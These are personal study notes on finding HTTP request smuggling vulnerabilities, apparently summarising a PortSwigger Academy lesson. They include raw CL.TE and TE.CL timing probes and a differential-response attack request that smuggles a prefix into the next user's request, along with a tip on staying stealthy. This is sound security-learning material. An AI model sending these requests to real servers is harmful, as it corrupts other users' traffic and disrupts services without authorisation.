---
description: 'https://portswigger.net/web-security/request-smuggling/finding'
---

# Finding HTTP request smuggling vulnerabilities

## About these notes

This page contains the notes I took while reading the Portswigger Academy site about[ finding HTTP request smuggling vulnerabilities.](https://portswigger.net/web-security/request-smuggling/finding)

The images found in these notes are also from Portswigger, so that I may refer back to them quickly 

## Finding HTTP request smuggling vulnerabilities

### using timing techniques

* send reqs that cause a time delay in the app's responses if a vulnerability is present.

#### finding cl.te vulns using timing techniques

sending a request like the following will often cause a delay for apps vulnerable to cl.te

 `POST / HTTP/1.1  
 Host: vulnerable-website.com  
 Transfer-Encoding: chunked  
 Content-Length: 4  
  
 1  
 A  
 X`

Front-end: Content-Length, so it forwards only part of this request omitting the x

Back-end: Transfer-encoding, processes the first chunk, then waits for the next chunk to arrive, which causes a noticeable time delay.

#### finding te.cl vulns using timing techniques

 `POST / HTTP/1.1  
 Host: vulnerable-website.com  
 Transfer-Encoding: chunked  
 Content-Length: 6  
  
 0  
  
 X`

front-end: transfer-encoding, forwards only part of message, omitting the x.

back-end: content-length, expects more content in body and waits for the remaining content to arrive, causing a noticeable time delay

{% hint style="info" %}
timing technique for te.cl can disrupt other app users if app is vulnerable to cl.te. To be stealthy, you should use the cl.te test first and continue to te.cl test only if the first test is unsuccessful
{% endhint %}

### Confirming HTTP request smuggling vulns using differential responses

try to use vulnerability by exploiting it to trigger differences in the contents of the applications responses. 

send two reqs in quick succession.

* an "attack" req to interfere with the processing of the next request
* a "normal" req

If the response to the normal req contains expected interference, then the vulnerability is confirmed.

example normal req

 `POST /search HTTP/1.1  
 Host: vulnerable-website.com  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 11  
  
 q=smuggling`

this req normally receives an HTTP resp 200 w/ search results

attack req needed to interfere with the normal req depends on the variant of req smuggling that is present: cl.te or te.cl

#### cl.te

 `POST /search HTTP/1.1  
 Host: vulnerable-website.com  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 49  
 Transfer-Encoding: chunked  
  
 e  
 q=smuggling&x=  
 0  
  
 GET /404 HTTP/1.1  
 Foo: x`

if successful, then the last two lines of this req are treated by the back-end server as belonging to the next request that is received. This will cause the subsequent "normal" req to look like

 `GET /404 HTTP/1.1  
 Foo: xPOST /search HTTP/1.1  
 Host: vulnerable-website.com  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 11  
  
 q=smuggling`

since the req now contains an invalid url, the server will respond with status code 404, 

{% hint style="info" %}
* attack req and normal req should be sent on different network connections to prove that vulnerability exists
* attack req and normal req should use same url and parameter names. some apps route reqs to different backends based on url/params
* send normal req immediately after attack req to try to beat race condition, including reqs from other users on the app
* if a load balancer is used, the attack req and normal req can be sent to different back-end servers
* if your attack succeeds in a subsequent req, but this wasn't the "normal" req you sent, then another app user was affected by your attack \*finger wags\* Exercise caution, this means you could have a disruptive effect on other users
{% endhint %}

